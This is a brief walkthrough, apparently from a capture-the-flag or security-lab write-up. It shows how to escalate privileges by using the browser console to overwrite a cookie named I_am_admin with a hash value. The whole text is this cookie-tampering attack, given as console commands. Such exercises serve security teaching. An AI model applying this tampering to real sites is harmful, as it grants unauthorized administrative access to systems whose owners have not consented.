# cookies

1. Open the Developper tools (F12)
2. Go on Console
3. Display the cookies using `document.cookie`
4. Change the cookies using `document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09"` (use `allow pasting` if needed)
5. Refresh the page
